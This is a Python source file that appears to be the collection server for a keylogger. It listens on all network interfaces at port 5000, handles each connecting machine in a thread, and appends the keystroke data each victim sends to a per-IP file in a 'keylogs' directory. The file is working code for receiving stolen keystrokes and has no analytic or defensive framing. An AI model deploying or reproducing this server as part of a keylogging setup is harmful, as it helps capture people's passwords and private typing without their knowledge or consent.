import socket
import threading
import os

output_dir = "./keylogs"
os.makedirs(output_dir, exist_ok=True)
print(f"Keylogs directory: {output_dir}")

SERVER_IP = "0.0.0.0"  # the server listens on all network interfaces
SERVER_PORT = 5000

def handle_client(client_socket, client_address):
    print(f"[+] New connection from {client_address}")
    client_file = os.path.join(output_dir, f"{client_address[0]}_keylogs.txt")
    print(f"Keylogs for client {client_address[0]} will be stored in: {client_file}")

    try:
        with open(client_file, "a") as file:
            while True:
                data = client_socket.recv(1024)  # Maximum message size
                if not data:
                    print(f"[-] Connection closed by client {client_address}")
                    break
                decoded_data = data.decode("utf-8")
                print(f"Received data from {client_address[0]}: {decoded_data}")
                file.write(decoded_data + "\n")
                file.flush()
    except Exception as e:
        print(f"[-] Error while handling client {client_address}: {e}")
    finally:
        client_socket.close()
        print(f"[-] Connection closed for {client_address}")

def start_server():
    print(f"[*] Starting server on {SERVER_IP}:{SERVER_PORT}")
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((SERVER_IP, SERVER_PORT))
        server.listen(5)
        print(f"[*] Server listening on {SERVER_IP}:{SERVER_PORT}")
        while True:
            client_socket, client_address = server.accept()
            print(f"[+] Accepted connection from {client_address}")
            client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_handler.start()
    except Exception as e:
        print(f"[!] Server error: {e}")
    finally:
        server.close()
        print("[*] Server stopped.")

if __name__ == "__main__":
    start_server()